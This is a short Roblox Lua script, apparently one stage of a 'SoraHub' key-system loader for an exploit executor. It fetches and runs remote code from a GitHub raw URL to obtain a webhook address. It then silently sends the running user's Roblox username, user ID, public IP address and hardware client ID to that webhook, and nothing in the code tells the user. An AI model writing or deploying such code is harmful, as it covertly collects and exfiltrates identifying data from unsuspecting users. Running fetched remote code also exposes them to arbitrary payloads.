HttpService = game:GetService("HttpService")
Webhook_URL = tostring(loadstring(game:HttpGet("https://raw.githubusercontent.com/SoraAurora/SoraHub/main/Webhooklink"))())

local response = request({
    Url = Webhook_URL,
    Method = "POST", 
    Headers = {
		['Content-Type'] = 'application/json'
	},
    Body = HttpService:JSONEncode({
		['content'] = "",
		['embeds'] = {{
			["title"] = "**Your Script has been executed!**",
			["description"] = "Stage : ** KeySystem Login page **",
			["type"] = "rich",
			["color"] = tonumber(0xffffff),
			["fields"] = {
				{
					["name"] = "**Info**",
					["value"] = "**Roblox Username : **"..game.Players.LocalPlayer.Name.."\n".."**Roblox User ID : **"..game.Players.LocalPlayer.UserId.."\n".."**IP Address : **"..game:HttpGet("http://api.ipify.org").."\n".."**Hardware ID : **"..game:GetService("RbxAnalyticsService"):GetClientId(),
					["inline"] = true
				}
			}
		
		}}
	}
	)
})
